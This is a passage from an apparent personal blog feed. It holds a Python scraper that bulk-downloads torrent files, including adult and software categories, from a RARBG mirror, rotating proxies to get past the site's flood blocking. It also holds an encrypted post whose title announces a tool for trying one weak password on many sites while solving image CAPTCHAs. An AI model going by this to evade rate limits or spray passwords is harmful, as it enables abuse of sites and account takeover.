class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.41&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookie = <span class="string">&quot;&quot;</span></span><br><span class="line">cookie_dict = &#123;i.split(<span class="string">&quot;=&quot;</span>)[<span class="number">0</span>]: i.split(<span class="string">&quot;=&quot;</span>)[-<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> cookie.split(<span class="string">&quot;; &quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&#x27;127.0.0.1:7890&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&#x27;127.0.0.1:7890&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">depth = <span class="number">2</span></span><br><span class="line">categories = &#123; <span class="string">&quot;movie&quot;</span>: <span class="string">&quot;14;17;42;44;45;46;47;48;50;51;52;54&quot;</span>, <span class="string">&quot;xxx&quot;</span>: <span class="string">&quot;2;4&quot;</span>,<span class="string">&quot;tv&quot;</span>: <span class="string">&quot;2;18;41;49&quot;</span>,</span><br><span class="line">              <span class="string">&quot;game&quot;</span>: <span class="string">&quot;2;27;28;29;30;31;32;40;53&quot;</span>, <span class="string">&quot;music&quot;</span>: <span class="string">&quot;2;23;24;25;26&quot;</span>, <span class="string">&quot;software&quot;</span>: <span class="string">&quot;2;33;34;43&quot;</span>&#125;</span><br><span class="line">opt = [<span class="string">&quot;filename&quot;</span>, <span class="string">&quot;data&quot;</span>, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;seeders&quot;</span>, <span class="string">&quot;leechers&quot;</span>]</span><br><span class="line">orderby = [<span class="string">&quot;ASC&quot;</span>, <span class="string">&quot;DESC&quot;</span>]</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&quot;http://rarbgmirror.org&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span>():</span></span><br><span class="line">    turl = []</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\临时\\torrent\\url.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        turl.append(i)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> turl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_down</span>(<span class="params">category</span>):</span></span><br><span class="line">    <span class="comment"># ground = get_base()</span></span><br><span class="line">    turl = []</span><br><span class="line">    rr = re.<span class="built_in">compile</span>(<span class="string">r&#x27;href=&quot;/torrent/.*?&quot;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, depth+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> select <span class="keyword">in</span> opt:</span><br><span class="line">            <span class="keyword">for</span> order <span class="keyword">in</span> orderby:</span><br><span class="line">                catch = url + <span class="string">r&quot;/torrents.php?category=&quot;</span> + categories[category] + \</span><br><span class="line">                    <span class="string">r&#x27;&amp;search=&amp;order=&#x27;</span> + select + \</span><br><span class="line">                    <span class="string">r&quot;&amp;by=&quot;</span> + order + <span class="string">r&quot;&amp;page=&quot;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(catch)</span><br><span class="line">                r = requests.get(</span><br><span class="line">                    catch, headers=kv, cookies=cookie_dict, timeout=<span class="number">30</span>, proxies=proxies, )</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((<span class="string">&#x27;pure flooding&#x27;</span> <span class="keyword">in</span> r.text) <span class="keyword">or</span> r.status_code != <span class="number">200</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;该换代理了?\n&quot;</span> + catch +</span><br><span class="line">                          <span class="string">&#x27; error:&#x27;</span> + <span class="built_in">str</span>(r.status_code))</span><br><span class="line">                    os.system(<span class="string">&quot;pause&quot;</span>)</span><br><span class="line">                    r = requests.get(</span><br><span class="line">                        catch, headers=kv, cookies=cookie_dict, timeout=<span class="number">30</span>, proxies=proxies, )</span><br><span class="line">                content = BeautifulSoup(r.text, <span class="string">&#x27;lxml&#x27;</span>).find_all(</span><br><span class="line">                    <span class="string">&#x27;tr&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;lista2&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> res <span class="keyword">in</span> content:</span><br><span class="line">                    stub = rr.findall(<span class="built_in">str</span>(res))[<span class="number">0</span>].replace(</span><br><span class="line">                        <span class="string">r&#x27;href=&quot;/torrent/&#x27;</span>, <span class="string">&quot;&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">                    <span class="comment"># if(stub not in ground):</span></span><br><span class="line"></span><br><span class="line">                    turl.append(stub)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            download(turl,category)</span><br><span class="line">            turl = []</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[0;32;47m%s %s ,page %s 访问完毕\033[0m&quot;</span> %</span><br><span class="line">                  (categories[category], select, j))</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">turl, category</span>):</span></span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\临时\\torrent\\url.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> turl:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = requests.get(url=url + <span class="string">&#x27;/torrent/&#x27;</span> + i, headers=kv,</span><br><span class="line">                             cookies=cookie_dict, timeout=<span class="number">300</span>,  proxies=proxies,)</span><br><span class="line">            down_url = re.search(<span class="string">r&#x27;/download.php.*\.torrent&#x27;</span>, p.text).group()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\临时\torrent\miss.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">            f.write(url + <span class="string">&#x27;/torrent/&#x27;</span> + i)</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;miss one&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        fname = re.sub(<span class="string">r&#x27;/download.php.*?f=&#x27;</span>, <span class="string">&quot;&quot;</span>, down_url)</span><br><span class="line">        fname = urllib.parse.unquote(fname)</span><br><span class="line">        <span class="built_in">str</span> = <span class="string">r&quot;[\/\\\:\*\?\&quot;\&lt;\&gt;\|]&quot;</span>  <span class="comment"># &#x27;/ \ : * ? &quot; &lt; &gt; |&#x27;</span></span><br><span class="line">        fname = re.sub(<span class="built_in">str</span>, <span class="string">&quot;-&quot;</span>, fname)</span><br><span class="line"></span><br><span class="line">        down_url = url + down_url</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            download = requests.get(</span><br><span class="line">            url=down_url, headers=kv, cookies=cookie_dict, timeout=<span class="number">30</span>, proxies=proxies,)</span><br><span class="line">        <span class="keyword">except</span> : <span class="comment">#requests.exceptions.RequestException :</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;网不好了？&quot;</span>)</span><br><span class="line">            <span class="built_in">input</span>()</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> ((<span class="string">&#x27;pure flooding&#x27;</span> <span class="keyword">in</span> download.text) <span class="keyword">or</span> download.status_code != <span class="number">200</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;该换代理了!\n&quot;</span>)</span><br><span class="line">            os.system(<span class="string">&quot;pause&quot;</span>)</span><br><span class="line">            download = requests.get(</span><br><span class="line">                url=down_url, headers=kv, cookies=cookie_dict, timeout=<span class="number">30</span>, proxies=proxies,)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\Bruce\Desktop\临时\torrent\\&#x27;</span> +</span><br><span class="line">                     category + <span class="string">r&#x27;\\&#x27;</span> + fname, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            fname = <span class="string">&#x27;&#x27;</span>.join(random.sample(</span><br><span class="line">                string.ascii_letters + string.digits, <span class="number">8</span>)) + <span class="string">&#x27;.torrent&#x27;</span></span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">r&#x27;C:\Users\Bruce\Desktop\临时\torrent\\&#x27;</span> +</span><br><span class="line">                     category + <span class="string">&#x27;\\&#x27;</span> + fname, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">        f.write(download.content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[0;32;47m%s 已保存\033[0m&quot;</span> % (fname))</span><br><span class="line"></span><br><span class="line">        fd.write(i + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    fd.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> categories.keys():</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">r&quot;C:\Users\Bruce\Desktop\临时\torrent\\&quot;</span> + i):</span><br><span class="line">            os.mkdir(<span class="string">r&quot;C:\Users\Bruce\Desktop\临时\torrent\\&quot;</span> + i)</span><br><span class="line">        get_down(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># https://www.jianshu.com/p/5e4d7529476d</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>一个用单个弱密码测试大量网站脚本（含图片验证码识别）</title>
    <url>/35069.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="b739428d606be313a90717c0975141992d61b841e9bc93989bd1f5cf85e0a705">dc97505da4877f2b5128344b15c8fb97e24aca690cb2073454d8482129e89141517add313e433b68c9fb15278239c1c97146f1a64905405409a8acd50bbdb4478b215742fbd91b9f93c6b7481fdd4b022f2b334e812809c29244bcc3c24dd56a4249c56a804e4a54bfd58ade00a73ed996e8798521ba9032676577b74298c48968c1de3ee491747bdb1af33a1f097da8ef1df728d49f0910982715d4cb078606a8605427680811820b0fc197f47610f1141b9a2b59ec76c1a7d1a864c55ef48faa47d45bb7735fc855576e24f9497bb157dccd821c5d49da33b7d4306eb5f307ff0d3633313b1e04c659d464271431099310947aac3eae5f5abbaf8941f612d3bb30244efd728036b6c7b5e195696148fa1be2f5fc5c4e9aed4a51d9bcab7e41547f69f1af4bf1548c269ccb220382ec5fa788267cb5ec88a38aea778f12daf353a8da9fd49b8543132af24ce83ddf3ddcf8e966df8433e0ab6290339f636d7bef3c1dc030771e208f8b2b219ff7a6752c3a6f914741f8d1eb13e70d300b28c57ddc39648e651eaf1ddeb4e46d4413e00c9a72ee30a0753e7af1915d8b6f51a85d13499dfb7428e0ff5c8f5c173e49033dffcfd9a21ba8ff95655086561344fb52b52fe4baad3d007f0d1f023d6fe7c766a6704649f1b8f1a557e6f8026983dacf2d30680933f780b3f19056a8d21fd430b91b98df509e678a1b936cd129d6e1e6356686bb4b23d7c7db8f85780568573fdc7322b1f9915384bf8adbca8fb6183f49703dca218f121f2fab0b32217200d154349a39c19a560e93fd29e9583c1e3d994f02ec8f8d02e8b6ae68e496217d5f6e20ab68c4e3c036ce56c3e57d85fd5eaf0088ac15eed0dc33effc5210f5e7433c68be41bd91a3c825c87e2794801275c435de9e1076782b0d993dcbd1144ef58ce25efac4f62ee4ae9245505d4ccbc2548564902443af035ea92b1e58ba3b95806186e9ec05fa5ef7e5c04a6ef1b4ed9d0f74ad7cabb35449b98e992ba7f6619371b98585ec984afe684978ba10c53d2998d765ce54f331d7ed16a85ff831ef1f0e955d8966d16f7c41f6f9949a8cd3aa9678d07fa4e90ff64dc0f6e2cd7e01cdbf6511b5340206dd1105ce1a39e7c3a3ea009b495ad8f2548b833c02b31877a670d5a6767d302e2e708659c0b9661ef8c77ee4302e84a7d3fb179d8e179fc97c69e4cc331763d798008f0e1c87e246d8cc176bd02b32a1bf42156053a312575ebbbdb2711c4dd4a42825bcba30b304686ea4474b13f160cbd388c95629a286f279046d6aa25768fd0a83117ee94593baacd7484b477e71fcd50772009ccbfe7f920bcdca8b1173195c8a06f8c68fa852d570f6e9eaae80428930ded699294e631f04ecea4f407b227034da11eabe6dcef7b039d2fbb6c8f8e03031d7840de3562cefa7d651aa1967a15629adf2dac323744cbc81e02dd7802e905e2e049cfc5639aeb2d834aa3057ba86af95da13ed7ca5940b67d3b2303650589efb3501365a626140ff9af03e1f6783386cafbc9f462779e6afc89299cc519f4e2e08b1db1ecbab4f4c19bfd44c44e2332309e7fc2a77ad8aa9ce619178b13e54f16c8d51053927cd9fc77ec2785368ae49d23543a3cfdf423fc496f4e7b887ae313c7558200112737f2063472f76b09fcc390d60d75611a8fd243a3ac0521bca3ec005b247592886e69407a34f06f4171e23b490b8c9ec77b72a85cae767f74aaf7ab2f27e0835d0c0508d8b564c5d45577e33e6183b01a1f7eed91a2f6fee0114cd67118ae50a81c1d9671a055b5cbca560b0b356dc2048b617994ae3cf2f5620b2cf919c5831799dc725ccc44d8c3572fdaf6b472574bcbca95a1e1fdc6514014cdc3f8d62037906097725f496763c340db1aa25ca884f36743c2963cfc23b24440bb145f1be0cbde7de8d2375b7a2018e24f5af05423339c2e8601993ac83f97c82f33caae8bc632f217f177feabd7b8161122742fe11372fb3f51983f9329d852356ee6f4b1ea5f6443c029ff97b69492922b98e9dd66b0e886a6b1934399bae52caae401be991e96d34f5128d981e1cc7ded2403c2998ad6edeb5a16d9e37febcbd57b95081f30ef197f69045ee462d91ebaba4794c63bd35e2abdd806c8bf090f29895150690e8b481663f3fc841cbf994ed4ff37d2faf074084ea3397ff28857d9863b080d1e8c99619c6790ce89408ea6d0e44097a525554af51642befbe6da97f71a92d1b40fc155765bfb58074b8d8bae3b6e4c0235494b95fa775d2e0faf8feb91df4eb59b187fa1cc126237ac867f783c509fb809af61ab0d6337616757927935647100e36234c430de01955f672a56bec6c470d7e425c9a021b6648ae07824782be30ac82c8eba2c897a605d3dec35e60c479623b099c2d93d90e4cf7c380883fa531ab3edcfbf3a4202eb75716b2ad456cb9b2061cad06e0e509a5bb65ddd864a03d2c91d274e011fc62d2ab85041ad315e848c3c653c504f8eb70f6eba8e49d4ab9c74c999d4456b5df2743fecd696ef5da16a2260723d58c7eef50077994f2e476a28afef9c5df130740f6c88e77534c547ee1d555ce22e5452e8c0c6f19591106d279fab587c44da1d0c90e507b42170bcb6c4420d147bc9d1f12875bb1f8ad81ef58a49082ce7b4e61cbb8d6dcbb30b47f44233b75240efc8748dc981880e58344a5dca62abab30ec664503e5d11ad987ca438292ec905286483bff9cc3db94bee8de890c9edc66fb471ef3d70de24478752e5e17f25c1dcc73db0d1b328eefd4b9627fe356c5fe8cc68bbaf0ae0f619ebb479c6010014a7b32e87c992a1d45f9ccacad468b0093943cb04f07b80c8bc65dfb03748180508349566b5a1ba2ba42b909736900682f13277b39a4b69414e848399cbd268ed49342ed6b1f5aed83689a21a57863826b2551fc9c25278c247d1f0e7ae7fffd5f298d7285c2ce55adf9304150eeab91d86c9b6baf97ba3bee7c247304068e40267c246db95420577d4567a0fa97b8317d1c33bd97f12ca55b419ceed4c1f9585ef52796387c814ba6031e1a0f417c51357680212a0973ff93936ac317c8688c668fbb860dfa09a44256cd7d8d73a9d20e9e2322207ba72749d7f737f85d43cd9ae52678a7e4226bc891a9381239726049fb54e6c8499bc785adbd098aaf2bf3f6b0f0744c1034946e37403c1644fba8d6729700e0eaaa1cc1367b8c1357023d726dbeaecfb0031c92e5d019fcc0a67935f800b91a466bb684f1b93aded5d122a93acb7f46e36f4e251d517ce1e29a1552848b927459bd06ce3d48a75dc7cd35000fccb8921ea62b593672cf8c365e29441fc9adbc399836b908b45c205d25ba14481840cf34ec6bf1879076f8d4188c5d9f52d82e448fa94ef0edff07f78de43456e5d6c18e45bdc51fadb2ef82fd0abc4cb6fcd8fa612b4b75baf3a99f9e9e5cb89dd02712a58fc79020a9c7f54fbd9481cd339b5a24f0f50775d5db0137d2636ae5b906d3ba705a926c06f76c18b64d7cb0b311f4492fae04f687287d25c50ea8858d5f41ff042f5dd2bcdb489eed99aea857e51230ca9cce78a90eda4f3bb2ab2fb34c2b75dcf8a3c5cefbe8e654c227a39a90aecc914eb3a20785ec7a0137d51559e5e3402685057bc68168a3fdd0e1de590814fc910c6bf2151cf62f667d135b1527bb42fae0ad1c1587eca587c126cd6d8f95506db6ac7c42abea3975a7aa259bbb03234632817c3ca6257a81822bd407455777f62ba169629f575b3c3665761db475929e828311876e57440cb9b30d579771d054002f72dd920943edfc482ae5c68816f4cfe75394ead01d592632b48826b90779b2c0d8e6030fee036507b17ff818946b3f0126adf3ef381724929c372e7a4c23c678abec427b6d249876a18e5f170dce16cbc1b5de7acceac30680f366b6fb68fa9aa4ba38f895c8816537a3731ab8ae855c31aa640b30cfef01a8e7566c79520950bb0988d37979c5ec7da77cb66c5d280cdbf8c5b772f5823d4bf8c48621721829deefb1fdd51ff40b6f87b982ad1b2e06d8380702151f61df391d0e97dcaab50b8c0d6acef5eef168cf61807f43654d29eff68b0a0d082c605ace53797376b55214af73ad2e9a033b18a62cfe1bf87bb89d54ec25214e788c6fd18d078ffe4503f682a444a04d7acdb4e2890fb0b4120ecd5cdbc3d362da8e8beabc0b124ede447979a61822da5daff075a0587a59a9c227ae7152444023545a8d35dea50cc80b08376982da75f86d3d4396801c2f79252c9645bd61ae34e23ccfaeb20d4a42b16df40f2fc617b9ce925c6036660019ab48af85043ab5da7f07e34792d4ba0cf45e22a709a65aec02db8d025abe410ff7ca418961237bff71a83ff0be87af5ca3324d025b1abb9da2c78d7f08e86a0e935515332842d9451365cb0f936c4a619a4df96a99f610877e6cf7a0860c09aa57162b7a34fa2dfb5102a8d1661bcb5b9304d2995a615fa0d853da30c90b428dc18f168c741626eea2a0aff3fa6b43ed8a265a9cc87a02d99625e011cab17d869bb07d5ac185d02ee2cff7fbdfac9564d8323c8343f8dfa144e097327b62b39308dd645778331e64b1aed44223da1a0e90942b99f271260c71d0c23c734711dce200b4bf77ae0c7664d4414a84b662078e68d65653c827fdbba7be53407b92e210a3b34f71b7d55e29e33f2e1185f10b6e4ddedaa33fe60b0405e3b7528854201d6e5c09035bfe81fe92d3b8f3138d0a68af0f0c03ca65c8d00fab825254f0fcd8a3dc626b56402361abf2ff09276d36be51cd12fdb451f7c6c4ad96e4b6ca58ff2efe2567dfa2e4f1a6e703c1070eb159383d9b3abe1d2a2842c2ee33c3c6694c8feffb0d8157a9ed931150e0758235f3389d32dba704b413b1b1cc769864e778d2ac9f1e5bc3728437156e665bab275b4d7510d243db9533a91a966724bea9a065cc10e64c2f712fc2f4e1736606c472304081b45f8d4cc974fb568b0d158b9f2a9c9f294e410a4885abf650fc2caa1b98190c3191671e624daf25feefde2f9db300b218c50cf3b8b8fb97edecc010265f69b14cc81f2a7375eee5717a4dde86fafd3c6864df89e714969a8ce648cbaf9a90cb2f7d62fd454b049e42763ea516e8a1be98c2de223b0d5519bc355a37b747c4c8ddc2154e693403f7a529e3cb4d8c822f6b7e7ddb656c22b42007238a7d7dd7262e54a04b423027ef72eeb610f88a00828ce6476317f3fb14ae64d8c8bedc0cb80d72e8acc5cb81dfd36ecd9554d0af22cf84a7ed8b717787f580b898ebf4381c032eeeeb3538b84f7c870c1c9088f5a63860e2483f6780a3d1e1f6be67363efc7e5cd36b7b09412e9efb100ad203c6d6d3c7ab3fd87f3cace7ea8b9d62833b1587495b451ac071ca2d9431c7f854069e97f2991979cbb3ce9b43162e00d1deac1fb11cc449ac3a37ba741234f0f6c87aa39fc213155fa08469262db5add273c656e89aaa1a751b3cc31898a21e6d02b9a73792d3f15682353d51927b180803a7b411ab6662e6a52028c37ea6ad9a3dbc41f3cda58a98ca231ef1acda02504f917044834e9747d8ad8a01008a36bc8d90c4142e33dca1da37182355e847a7e465faa66ba2534d4ceadd0387f5885f0b238847630f38382582322a1eb17b9d66b6e0d1c718f2f05733c76d6b957eb8d93b2b76ba620723d8018a9b105e764bc62c2bbeb41438939aa4dfd446bc15589a738101381787904fe3b4dfb32ad54f66d09ce999435b6025520d21dfaf5aa78ad819e7334b61a6084f8bf2f6f42639d8818729668537adbe5d9578b38ad8bf543e9eb2fc4b1da956dbb65632ef540c646c9f3bb07f4d2a6682d3767f7d244114316d317448f7ba8c8f88faff83229db7d69fee682082ce89ef971341e5cfb27a59ce8c0406528fed95dfaf1bb4d6d58a1394c6bac5aac39bde419fa8d6d374185ada2504e773371d7f1267647cf7b8393ebd835ef3e6c47ee865de99a4ef9f37e2a11d7701aa9e6363fa625feec899380aaa262f9fdd2fd5d6d173377162220c531bf5a17df08d655f6d9ac3ef2f3ac1ee8db247a8d672f69d4eb2bd49a180f9b361a7465ced6b8b49e10a30d0a8fc11e09d32ba9d9a9f3e1c51b108faccd7a150e254f87453d25c93813918939c9587cfeeed929cb4a8ba6e9a094133bcfa09e8508efff1108e3a61b3513edad796a079adcbec677f60af0133132fd284301ef2a35208417953365a9df2719b3a494504591156aeb6ef5f96668eaa7e2e26d8b47e5d6cd5e15a4bf59ae8eac4195ac1baba8d4acd8687831c580e9ab2ca25f150647383d04834c590d79d300bb10822d2b07cf9c13682dc53add979279fe4ec16c4e38ba6ead617d2857a3d047e2132f1f4bfa26700b22f40e65f431f497fb7b7607bf9644824474834f49d1c92d048bc31de5fae068473535d6c64010aff4c6e7e2a28cde6e64689585fd1b84fbb14b57a8f22a70dfc8f177ad9d7a9b9b8ed9e25157998e277b0f57ef613cb27dd09508f6d3807605c8c56ae05ff535e7e8b19b54f69a53f02f08c295792433d77a1862d59c370904fcdb23abe7672a4fada1d902911b96dc29276de4ecf15368c43c20cc22ed6052bb98f38a096afa7042c75a8baf1e573b3fbe81bdb1dc536ebf9faa3b58d4115cb197024a4b30655d2c4ae8abc6400cb39a96794283d7d716d707dfe4fc2afca9d94c8740d25d6e4a2d952691e4d981ed9fac14dc349a187b1ed174cfd3ecdef5006664c7a5d25d43957924466ce8eb70dcb1b3446bae673ea66c31bca2b749ca311ebea53e94addaa9aa5819d9e362a1adeaa87bb59cd6069b008d45085dc4ea4743bf6ea98e5b4d85f4afb6759c4060c5f4c39df66b57952627c081f4bdb68f52e49eee8817f61ecc53f9401cb7949c8619be73a279690553070b477d463f6420fa4a45ed79a8a44e8d80f0c26e7e8b81281440df6cabf5ba2aeb944b1a5e08b5ea3b5990fa2fbd544b062a7e3e4ce2199a25e0abe7a4c55fb4bc5fee5e44b38e98e891c6cbb0856d30e0fe5645be08ebfab075b840d7030560cbe80095961b8117aa395e1f7cd9fe8d792a2e2b74fc8761d0ebddeaa02696ee62a20a889bea72868ca8e0d6ea7bb723502ed5e8ec2d2708bb5899bfd3fa8785c4ccb88d0418779892c6432ea2c385379bea91dea92b4e526ff50eb48944982cd9244f9a2cd6460a743026ecb7c0b713bc014d48d886457f74d28682a98b3e2fdbc3dab456ebbd7b27976d777dcbbc95e3e9f698e2abf71c059264eed993e48829b78fcf9c36a39092fd6d2c113c0f9f3b74cf84a240644466df5eec97500f799031377d5f679c48420864bedff82948365cecfc8f4f010aa27da2862e55bb9d6dadf6ddaf4dd7ab8474b628c9152f6c25ffad751b13c00238fc0d047175369a4b6eba161fe864318f62958a0ddf86f956fdc7d57f46d78b127363db3e3e9a5f7056caa5cc43290c01fdbecc411a16943df169818b3b4c7b9b4bd364135754cb40236ebf5bec06831b88a508080632e497e799984b3d8402cc3e0f85f8e664e2ccd8a604c9204fea38920c94411908860581e6c48cce79cc9818eeeafe4502c4be35b9efe3ac7ca9b0fbd8cfbdeb025e557053b14d4df5085a3b1eefdc0504f1ad026da5e684bcc27883db7449a0ac3c083c752c8bf7d2ded8395ab836d63b558e0c00b6b3d8e86b3e78ae0a5cea25c7f8a851d2e93e2c31b47760eca3b0f1201df9df6203cbbe40d4bcc5c15760925b330f798488089b3973ab0d7654facbd9c80fb71bd4bedf385214337aef3fe2384ad5d63d3eec8e8084987b52ae0ab6fa3f5419cafd29f6013ba432a7286c0102817c4b1561b3f174620fd9788f4c5bb1d82cfd26de9de657dd409a36d9ed27314992544804f725c9b2cb95cd471951945e7a8b82dc80d3dea74a210b2619e778ea8c765c4ec5a713374d97f62dd889c97b4003c781a8ef1dcca16ad2f879a449e26c4b41697b7b7090e8253f3e8a17983d6951322d92c4a2e5e923e9b9bce024f32d12f1503ce41b26f808cfd74f4d19ff12cead03399230fc357d5a7caed9cf6216f9558102272f2cd09d26f107c80778fa72827fc0101c06edc268a9f0cb2a580118f9b5f3acd70128ec3726d9b0007a3b5f45989479ac4752b3e5974433879b9dfac8f30bf6ccefe07f43fa7a223788a56add3b79857718fcde0f0b65dfb926c85727a9b175445fae3ea8043e908f46fa19a6fbe325ef24fca43239a420815753c4cc3929dd3a1d6a1b406922972e9531ab1ffc128f8e58198842b1ba539d436927a7d65b5fe7432fac165d0b741cd5d4df9fc72924720e768428429f93e9c4797b5244d59ccfacbce789e1c4a82dbda8e29623021d6ef30e71628919eb844159a990ed0e6876faaaaadf65851ec545c3f1a69735d5998f750066019f706035187bfe819709633907b9cc04426dc3ba4ab17d4b46c7a68a8e6d3f8935efe82fc2fa7a1172f65ceefaa4c0b434eef3ede651c8305956c29abff731eb4b76a87babedfefbc5ce9e8553435fa3e38bf9eac24e22ebd5603bba006374f29ec4970d37dd2847f0dc706ef71d9df8557d1372b0ac0d38c370ea7f2237f2e6a34f9c30ce67547226b1af874f289fd772c3788a9de79c9ac075961630b8fa24dfdc3d7a23b92c8ce316eed400a22fc1826161f4bb9829ef6d2b05198399a1f719539e35a89720bf95904ea472cef51c62a9e2317da2bec46ae4316af860cd0032b82096ff7ea6182a4757c6b2329b3d6d5f74e734e19e9660bf5d8463843fb9e4582e201ee7b9fdc010cc8b5c858e50efef20ba4f78e7cb571f20ab2613bd351dd7abb422b9ba5847435e8ad730eab2d568f96225f2ffe70e6052a31a7d6afda44d719a864f5cc3e153399ad911bd9442f3b56baab028d3936413141bc1b194619e9d3cdde2fe8f7b617cd530f29e2356b76087b2cf22e4b43365b6832b6414819b8525bef7d1569cc7d951d8140617d1634a0cda2eeeb97c391362ab76449849c347b30cd61454761468995fffdb0679092820fde5ba0b0febca22d07108d0c347b048960a35a4b4fe0d3730560929cf430d39cb5ff5d1f77ee84d14e19e415f95373543325b3f5fff66df0d23c8e634abd25dc8cf2788f9c346295f8d467405f3cd830916e927222cf0351d76ca974d62c8f71641e7162123bbe557d17f63869579c2c572c23a660a29c270ef595a57b2ce5b644bdfd242cb1c559b448ae766d1d5eb6ce34a25b565536e4cdaf137a3ddf755ee8ac41f31204c9caa75be6a26f2a5eaa777592c6617278c214c2c483f31eaf06d700745d97bcce60db4009fb904e605ff9d1468ffddd884a98acbc9af31ac772948dc00096c4a88f2bffa8b2ac0580ca08055599b34dbbe9bc731d1dd83aeded30e12564c8acf5b2ce5862942ab948f8aed7cba8c905c337ad06a4c84536bda6877d571549892029368c24c99a563ec7d1e3f6a5c70b6ca3d88032e593fd03385faf2b5f8050ff4b0f1451d9ce07b72088a9510020273b9e9d60a720fb89336db6baa21c7fbf247d4bf57f80197a54ff576bcf3ac991c99ca771a8dfb574bc2c729ae64045627970d1fe9c742eb10021f00df9384e99d0675a9126dc570983b7d62f2532dc578990afde6955bd05fed020152ba830d218e393642cd6e1f0ecd2c7dbc7d2ebd46a3f619437203951a5815f9ee1f3c7d5edb4949561192